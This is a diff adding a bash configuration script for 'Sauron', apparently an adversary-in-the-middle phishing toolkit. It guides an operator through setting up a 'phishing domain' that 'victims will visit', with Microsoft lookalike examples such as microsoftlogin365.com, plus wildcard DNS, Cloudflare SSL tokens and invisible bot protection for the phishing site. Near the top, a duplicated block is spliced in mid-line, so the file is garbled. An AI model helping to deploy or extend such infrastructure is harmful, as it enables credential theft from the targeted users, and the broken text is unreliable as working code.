@@ -1,0 +1,574 @@
+#!/bin/bash
+
+# Sauron Environment Configuration Manager
+# Interactive setup and management of environment variables
+# Compatible with Bash 3.2+
+
+set -e
+
+# Color codes for output
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+PURPLE='\033[0;35m'
+CYAN='\033[0;36m'
+WHITE='\033[1;37m'
+NC='\033[0m' # No Color
+
+# Configuration file
+ENV_FILE=".env"
+    
+    # Create temporary file for new configuration
+    local temp_file="/tmp/sauron_env_$$"
+    
+    # Write header
+    cat > "$temp_file" << EOF
+# Sauron MITM Proxy Configuration
+# Generated on $(date)
+# Documentation: https://github.com/Skillz147/sauron
+
+# Required Configuration
+EOF
+    
+    # Handle required variables
+    echo -e "${WHITE}========================================${NC}"
+    echo -e "${WHITE}           REQUIRED SETTINGS${NC}"
+    echo -e "${WHITE}========================================${NC}"
+    echo ""PLE='\033[0;35m'
+CYAN='\033[0;36m'
+WHITE='\033[1;37m'
+NC='\033[0m' # No Color
+
+# Configuration file
+ENV_FILE=".env"
+
+echo -e "${BLUE}🔧 Sauron Environment Configuration Manager${NC}"
+echo -e "${BLUE}===========================================${NC}"
+echo ""
+
+# Function to generate random secrets
+generate_secret() {
+    if command -v openssl >/dev/null 2>&1; then
+        openssl rand -hex 32
+    else
+        # Fallback method
+        date +%s | md5sum | head -c 32
+    fi
+}
+
+# Function to get current value from .env
+get_env_value() {
+    local var_name="$1"
+    if [ -f "$ENV_FILE" ]; then
+        grep "^${var_name}=" "$ENV_FILE" 2>/dev/null | cut -d'=' -f2- | sed 's/^["'\'']//' | sed 's/["'\'']$//'
+    fi
+}
+
+# Function to check if variable is set
+is_var_set() {
+    local var_name="$1"
+    local value=$(get_env_value "$var_name")
+    [ -n "$value" ]
+}
+
+# Function to mask sensitive values
+mask_sensitive() {
+    local var_name="$1"
+    local value="$2"
+    
+    case "$var_name" in
+        *TOKEN*|*SECRET*|*KEY*)
+            echo "${value:0:8}..."
+            ;;
+        *)
+            echo "$value"
+            ;;
+    esac
+}
+
+# Function to display current configuration
+show_current_config() {
+    echo -e "${CYAN}📋 Current Configuration:${NC}"
+    echo -e "${CYAN}=========================${NC}"
+    
+    if [ ! -f "$ENV_FILE" ]; then
+        echo -e "${YELLOW}⚠️  No .env file found${NC}"
+        return
+    fi
+    
+    echo ""
+    echo -e "${WHITE}Required Variables:${NC}"
+    
+    # Check SAURON_DOMAIN
+    value=$(get_env_value "SAURON_DOMAIN")
+    if [ -n "$value" ]; then
+        echo -e "  ${GREEN}✅ SAURON_DOMAIN${NC} = $value"
+    else
+        echo -e "  ${RED}❌ SAURON_DOMAIN${NC} = (not set)"
+    fi
+    echo -e "     Your phishing domain (e.g., microsoftlogin365.com)"
+    echo ""
+    
+    # Check CLOUDFLARE_API_TOKEN
+    value=$(get_env_value "CLOUDFLARE_API_TOKEN")
+    if [ -n "$value" ]; then
+        masked_value=$(mask_sensitive "CLOUDFLARE_API_TOKEN" "$value")
+        echo -e "  ${GREEN}✅ CLOUDFLARE_API_TOKEN${NC} = $masked_value"
+    else
+        echo -e "  ${RED}❌ CLOUDFLARE_API_TOKEN${NC} = (not set)"
+    fi
+    echo -e "     Cloudflare API token for automatic SSL certificates"
+    echo ""
+    
+    # Check TURNSTILE_SECRET
+    value=$(get_env_value "TURNSTILE_SECRET")
+    if [ -n "$value" ]; then
+        masked_value=$(mask_sensitive "TURNSTILE_SECRET" "$value")
+        echo -e "  ${GREEN}✅ TURNSTILE_SECRET${NC} = $masked_value"
+    else
+        echo -e "  ${RED}❌ TURNSTILE_SECRET${NC} = (not set)"
+    fi
+    echo -e "     Cloudflare Turnstile secret key"
+    echo ""
+    
+    echo -e "${WHITE}Optional Variables:${NC}"
+    
+    # Check LICENSE_TOKEN_SECRET
+    value=$(get_env_value "LICENSE_TOKEN_SECRET")
+    if [ -n "$value" ]; then
+        masked_value=$(mask_sensitive "LICENSE_TOKEN_SECRET" "$value")
+        echo -e "  ${GREEN}✅ LICENSE_TOKEN_SECRET${NC} = $masked_value"
+    else
+        echo -e "  ${YELLOW}⚠️  LICENSE_TOKEN_SECRET${NC} = (will auto-generate)"
+    fi
+    echo -e "     License token secret for premium features"
+    echo ""
+    
+    # Check DEV_MODE
+    value=$(get_env_value "DEV_MODE")
+    if [ -n "$value" ]; then
+        echo -e "  ${GREEN}✅ DEV_MODE${NC} = $value"
+    else
+        echo -e "  ${YELLOW}⚠️  DEV_MODE${NC} = (using default: false)"
+    fi
+    echo -e "     Development mode (true/false)"
+    echo ""
+    
+    # Check STAGING
+    value=$(get_env_value "STAGING")
+    if [ -n "$value" ]; then
+        echo -e "  ${GREEN}✅ STAGING${NC} = $value"
+    else
+        echo -e "  ${YELLOW}⚠️  STAGING${NC} = (using default: false)"
+    fi
+    echo -e "     Use Let's Encrypt staging environment (true/false)"
+    echo ""
+}
+
+# Function to validate domain
+validate_domain() {
+    local domain="$1"
+    if echo "$domain" | grep -E '^[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$' >/dev/null; then
+        return 0
+    else
+        echo -e "${RED}❌ Invalid domain format${NC}"
+        return 1
+    fi
+}
+
+# Function to validate boolean
+validate_boolean() {
+    local value="$1"
+    case "${value}" in
+        true|TRUE|false|FALSE)
+            echo "${value}" | tr '[:upper:]' '[:lower:]'
+            return 0
+            ;;
+        *)
+            echo -e "${RED}❌ Invalid boolean value. Use 'true' or 'false'${NC}"
+            return 1
+            ;;
+    esac
+}
+
+# Function to prompt for a value
+prompt_for_value() {
+    local var_name="$1"
+    local description="$2"
+    local current_value="$3"
+    local is_secret="$4"
+    
+    echo -e "${PURPLE}🔹 $var_name${NC}"
+    echo -e "   $description"
+    
+    if [ -n "$current_value" ]; then
+        local display_value="$current_value"
+        if [ "$is_secret" = "true" ]; then
+            display_value="${current_value:0:8}..."
+        fi
+        echo -e "   Current value: $display_value"
+        echo -n "   Keep current value? [Y/n]: "
+        read -r keep_current
+        case "$keep_current" in
+            [Nn]|[Nn][Oo])
+                current_value=""
+                ;;
+            *)
+                echo "$current_value"
+                return
+                ;;
+        esac
+    fi
+    
+    echo -n "   Enter value: "
+    if [ "$is_secret" = "true" ]; then
+        read -s new_value
+        echo ""
+    else
+        read -r new_value
+    fi
+    
+    echo "$new_value"
+}
+
+# Function to check if all required vars are set
+check_required_vars() {
+    local missing_vars=""
+    
+    if ! is_var_set "SAURON_DOMAIN"; then
+        missing_vars="$missing_vars SAURON_DOMAIN"
+    fi
+    
+    if ! is_var_set "CLOUDFLARE_API_TOKEN"; then
+        missing_vars="$missing_vars CLOUDFLARE_API_TOKEN"
+    fi
+    
+    if ! is_var_set "TURNSTILE_SECRET"; then
+        missing_vars="$missing_vars TURNSTILE_SECRET"
+    fi
+    
+    if [ -n "$missing_vars" ]; then
+        echo -e "${RED}❌ Missing required variables:$missing_vars${NC}"
+        return 1
+    fi
+    
+    echo -e "${GREEN}✅ All required variables are set${NC}"
+    return 0
+}
+
+# Function to interactive setup
+interactive_setup() {
+    echo -e "${BLUE}🔧 Interactive Environment Setup${NC}"
+    echo -e "${BLUE}=================================${NC}"
+    echo ""
+    echo -e "${WHITE}This will guide you through configuring Sauron with the required settings.${NC}"
+    echo -e "${WHITE}For detailed instructions on where to get these values, see:${NC}"
+    echo -e "${CYAN}https://github.com/Skillz147/Sauron-Pro#configuration-management${NC}"
+    echo ""
+    echo -e "${WHITE}You will need:${NC}"
+    echo -e "  ${GREEN}1.${NC} A domain name (e.g., microsoftlogin365.com)"
+    echo -e "  ${GREEN}2.${NC} Cloudflare account with your domain added"
+    echo -e "  ${GREEN}3.${NC} Cloudflare API token (for SSL certificates)"
+    echo -e "  ${GREEN}4.${NC} Cloudflare Turnstile secret (for bot protection)"
+    echo ""
+    echo -e "${YELLOW}💡 Need help getting these values? Check the README for step-by-step instructions!${NC}"
+    echo ""
+    read -p "Press Enter to continue with configuration..." -r
+    echo ""
+    
+    # Create temporary file for new configuration
+    local temp_file="/tmp/sauron_env_$$"
+    
+    # Write header
+    cat > "$temp_file" << EOF
+# Sauron MITM Proxy Configuration
+# Generated on $(date)
+# Documentation: https://github.com/Skillz147/sauron
+
+# Required Configuration
+EOF
+    
+    # Handle required variables
+    echo -e "${WHITE}========================================${NC}"
+    echo -e "${WHITE}           REQUIRED SETTINGS${NC}"
+    echo -e "${WHITE}========================================${NC}"
+    echo ""
+    
+    # SAURON_DOMAIN
+    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "${WHITE}📌 STEP 1: Your Phishing Domain${NC}"
+    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo ""
+    echo -e "${WHITE}This is the domain name that victims will visit.${NC}"
+    echo -e "${WHITE}Examples: ${GREEN}microsoftlogin365.com${NC}, ${GREEN}msftauthentication.com${NC}, ${GREEN}office365secure.com${NC}"
+    echo ""
+    echo -e "${YELLOW}Requirements:${NC}"
+    echo -e "  • Purchase domain from any registrar (Namecheap, GoDaddy, etc.)"
+    echo -e "  • Add domain to Cloudflare (free account)"
+    echo -e "  • Set wildcard DNS: *.yourdomain.com → your server IP"
+    echo ""
+    current=$(get_env_value "SAURON_DOMAIN")
+    while true; do
+        value=$(prompt_for_value "SAURON_DOMAIN" "Enter your phishing domain (no http://, just the domain)" "$current" "false")
+        
+        if [ -z "$value" ]; then
+            echo -e "${RED}❌ Domain is required${NC}"
+            continue
+        fi
+        
+        if validate_domain "$value"; then
+            echo "# Your phishing domain" >> "$temp_file"
+            echo "SAURON_DOMAIN=$value" >> "$temp_file"
+            echo "" >> "$temp_file"
+            echo -e "${GREEN}✅ Domain configured: $value${NC}"
+            break
+        fi
+    done
+    echo ""
+    
+    # CLOUDFLARE_API_TOKEN
+    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "${WHITE}📌 STEP 2: Cloudflare API Token${NC}"
+    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo ""
+    echo -e "${WHITE}This token allows Sauron to automatically generate SSL certificates.${NC}"
+    echo ""
+    echo -e "${YELLOW}How to get it:${NC}"
+    echo -e "  ${GREEN}1.${NC} Go to https://dash.cloudflare.com/"
+    echo -e "  ${GREEN}2.${NC} Click 'My Profile' → 'API Tokens'"
+    echo -e "  ${GREEN}3.${NC} Click 'Create Token' → 'Custom token'"
+    echo -e "  ${GREEN}4.${NC} Permissions: Zone:Zone:Read + Zone:DNS:Edit"
+    echo -e "  ${GREEN}5.${NC} Zone Resources: Include → Specific zone → your domain"
+    echo -e "  ${GREEN}6.${NC} Copy the generated token"
+    echo ""
+    current=$(get_env_value "CLOUDFLARE_API_TOKEN")
+    while true; do
+        value=$(prompt_for_value "CLOUDFLARE_API_TOKEN" "Enter your Cloudflare API token" "$current" "true")
+        
+        if [ -z "$value" ]; then
+            echo -e "${RED}❌ API token is required${NC}"
+            continue
+        fi
+        
+        echo "# Cloudflare API token for automatic SSL certificates" >> "$temp_file"
+        echo "CLOUDFLARE_API_TOKEN=$value" >> "$temp_file"
+        echo "" >> "$temp_file"
+        echo -e "${GREEN}✅ API token configured${NC}"
+        break
+    done
+    echo ""
+    
+    # TURNSTILE_SECRET
+    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "${WHITE}📌 STEP 3: Turnstile Secret Key${NC}"
+    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo ""
+    echo -e "${WHITE}This provides bot protection for your phishing site.${NC}"
+    echo ""
+    echo -e "${YELLOW}How to get it:${NC}"
+    echo -e "  ${GREEN}1.${NC} Go to https://dash.cloudflare.com/"
+    echo -e "  ${GREEN}2.${NC} Select your domain"
+    echo -e "  ${GREEN}3.${NC} Go to 'Security' → 'Turnstile'"
+    echo -e "  ${GREEN}4.${NC} Click 'Add Site'"
+    echo -e "  ${GREEN}5.${NC} Site name: 'Sauron Bot Protection'"
+    echo -e "  ${GREEN}6.${NC} Domain: your domain name"
+    echo -e "  ${GREEN}7.${NC} Widget type: 'Invisible'"
+    echo -e "  ${GREEN}8.${NC} Copy the SECRET KEY (not Site Key!)"
+    echo ""
+    current=$(get_env_value "TURNSTILE_SECRET")
+    while true; do
+        value=$(prompt_for_value "TURNSTILE_SECRET" "Enter your Turnstile SECRET KEY" "$current" "true")
+        
+        if [ -z "$value" ]; then
+            echo -e "${RED}❌ Turnstile secret is required${NC}"
+            continue
+        fi
+        
+        echo "# Cloudflare Turnstile secret key" >> "$temp_file"
+        echo "TURNSTILE_SECRET=$value" >> "$temp_file"
+        echo "" >> "$temp_file"
+        echo -e "${GREEN}✅ Turnstile secret configured${NC}"
+        break
+    done
+    echo ""
+    
+    # Add optional configuration section
+    echo "# Optional Configuration" >> "$temp_file"
+    
+    # Handle optional variables
+    echo -e "${WHITE}========================================${NC}"
+    echo -e "${WHITE}          OPTIONAL SETTINGS${NC}"
+    echo -e "${WHITE}========================================${NC}"
+    echo ""
+    echo -e "${WHITE}These settings have sensible defaults but can be customized:${NC}"
+    echo ""
+    
+    # LICENSE_TOKEN_SECRET
+    current=$(get_env_value "LICENSE_TOKEN_SECRET")
+    if [ -z "$current" ]; then
+        current=$(generate_secret)
+        echo -e "${GREEN}🔐 Auto-generated LICENSE_TOKEN_SECRET${NC}"
+    fi
+    
+    value=$(prompt_for_value "LICENSE_TOKEN_SECRET" "License token secret for premium features" "$current" "true")
+    if [ -z "$value" ]; then
+        value=$(generate_secret)
+        echo -e "   ${GREEN}Generated new secret${NC}"
+    fi
+    echo "# License token secret for premium features" >> "$temp_file"
+    echo "LICENSE_TOKEN_SECRET=$value" >> "$temp_file"
+    echo "" >> "$temp_file"
+    echo ""
+    
+    # DEV_MODE
+    current=$(get_env_value "DEV_MODE")
+    while true; do
+        value=$(prompt_for_value "DEV_MODE" "Development mode (true/false)" "$current" "false")
+        
+        if [ -z "$value" ]; then
+            value="false"
+        fi
+        
+        if validated_value=$(validate_boolean "$value"); then
+            echo "# Development mode (true/false)" >> "$temp_file"
+            echo "DEV_MODE=$validated_value" >> "$temp_file"
+            echo "" >> "$temp_file"
+            break
+        fi
+    done
+    echo ""
+    
+    # STAGING
+    current=$(get_env_value "STAGING")
+    while true; do
+        value=$(prompt_for_value "STAGING" "Use Let's Encrypt staging environment (true/false)" "$current" "false")
+        
+        if [ -z "$value" ]; then
+            value="false"
+        fi
+        
+        if validated_value=$(validate_boolean "$value"); then
+            echo "# Use Let's Encrypt staging environment (true/false)" >> "$temp_file"
+            echo "STAGING=$validated_value" >> "$temp_file"
+            echo "" >> "$temp_file"
+            break
+        fi
+    done
+    echo ""
+    
+    # Save configuration
+    save_configuration "$temp_file"
+    rm -f "$temp_file"
+}
+
+# Function to save configuration
+save_configuration() {
+    local temp_file="$1"
+    
+    echo -e "${CYAN}💾 Saving configuration to $ENV_FILE...${NC}"
+    
+    # Create backup if file exists
+    if [ -f "$ENV_FILE" ]; then
+        cp "$ENV_FILE" "$ENV_FILE.backup.$(date +%Y%m%d_%H%M%S)"
+        echo -e "${YELLOW}📦 Backup created: $ENV_FILE.backup.$(date +%Y%m%d_%H%M%S)${NC}"
+    fi
+    
+    # Move temp file to .env
+    mv "$temp_file" "$ENV_FILE"
+    
+    echo -e "${GREEN}✅ Configuration saved successfully!${NC}"
+}
+
+# Function to show help
+show_help() {
+    echo "Usage: $0 [command]"
+    echo ""
+    echo "Commands:"
+    echo "  check      - Check current configuration and show missing variables"
+    echo "  setup      - Run interactive setup to configure all variables"
+    echo "  show       - Display current configuration"
+    echo "  validate   - Validate current configuration"
+    echo "  reset      - Reset configuration (interactive)"
+    echo "  help       - Show this help message"
+    echo ""
+    echo "If no command is provided, will check configuration and offer setup if needed."
+}
+
+# Main logic
+main() {
+    case "${1:-}" in
+        "check")
+            show_current_config
+            if ! check_required_vars; then
+                echo ""
+                echo -n "Would you like to run interactive setup? [y/N]: "
+                read -r run_setup
+                case "$run_setup" in
+                    [Yy]|[Yy][Ee][Ss])
+                        interactive_setup
+                        ;;
+                esac
+            fi
+            ;;
+        "setup")
+            interactive_setup
+            ;;
+        "show")
+            show_current_config
+            ;;
+        "validate")
+            if check_required_vars; then
+                echo -e "${GREEN}✅ Configuration is valid${NC}"
+                exit 0
+            else
+                echo -e "${RED}❌ Configuration is invalid${NC}"
+                exit 1
+            fi
+            ;;
+        "reset")
+            echo -n "⚠️  This will reset your entire configuration. Continue? [y/N]: "
+            read -r confirm_reset
+            case "$confirm_reset" in
+                [Yy]|[Yy][Ee][Ss])
+                    if [ -f "$ENV_FILE" ]; then
+                        mv "$ENV_FILE" "$ENV_FILE.backup.$(date +%Y%m%d_%H%M%S)"
+                    fi
+                    interactive_setup
+                    ;;
+            esac
+            ;;
+        "help"|"-h"|"--help")
+            show_help
+            ;;
+        "")
+            # Default behavior: check and offer setup if needed
+            show_current_config
+            if ! check_required_vars; then
+                echo ""
+                echo -n "🔧 Some required variables are missing. Would you like to run interactive setup? [Y/n]: "
+                read -r run_setup
+                case "$run_setup" in
+                    [Nn]|[Nn][Oo])
+                        ;;
+                    *)
+                        interactive_setup
+                        ;;
+                esac
+            else
+                echo -e "${GREEN}🎉 Your configuration looks good!${NC}"
+                echo ""
+                echo -e "${CYAN}💡 Tip: Run '$0 setup' to modify your configuration anytime${NC}"
+            fi
+            ;;
+        *)
+            echo -e "${RED}❌ Unknown command: $1${NC}"
+            echo ""
+            show_help
+            exit 1
+            ;;
+    esac
+}
+
+# Run main function
+main "$@"
